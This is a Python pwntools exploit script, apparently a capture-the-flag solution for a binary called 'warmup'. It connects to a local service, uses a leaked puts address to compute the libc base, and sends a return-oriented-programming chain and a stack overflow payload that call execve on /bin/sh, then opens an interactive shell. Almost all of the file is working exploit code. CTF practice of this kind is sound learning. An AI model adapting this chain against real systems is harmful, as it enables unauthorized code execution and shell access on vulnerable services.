
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./warmup
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './warmup_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

from struct import pack
#io = start()
libc = ELF("lib")

io = remote("localhost","1338")
#io = process("./warmup")
us = (io.recvline()).decode()
us = us.replace("\n","")
print(us)
base = int(us,16)- libc.symbols['puts']
print(hex(base))
bin_sh = base + 0x1cb42f
sys_call = base + 0x00000000000288b5

pop_rdi = base + 0x000000000010f75b

p= lambda x: pack('Q',x)

IMAGE_BASE_0 = 0x0000000000400000
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += p64(pop_rdi) 
rop += p64(bin_sh) 
rop += p64(base + 0x0000000000110a4d) #pop rsi; ret 
rop += p64(0)
rop += p64(base + 0x00000000000eef34) #: mov eax, 0x3b ; syscall
pay1 = rop

io.sendline(pay1)

pay2 = b"a"*64+p64(0x404060) + p64(0x401186)
io.sendline(pay2)

io.interactive()

